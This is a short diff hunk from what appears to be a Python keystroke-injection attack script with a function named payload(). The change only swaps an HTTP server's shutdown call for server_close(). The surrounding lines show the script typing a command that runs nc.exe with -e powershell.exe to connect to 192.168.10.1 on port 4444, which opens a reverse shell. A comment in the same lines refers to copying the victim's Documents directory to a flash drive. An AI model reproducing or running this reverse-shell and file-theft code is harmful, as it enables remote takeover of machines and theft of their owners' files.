@@ -58,7 +58,7 @@ def payload():
 	eco.type("./nc.exe 192.168.10.1 4444 –e powershell.exe")
 	shelllistener.join()
 	# Copy Documents Directory to Flash Drive
-	httpd.shutdown()
+	httpd.server_close()
 	httplistener.join()
 
 # Ensures simple gadget is selected
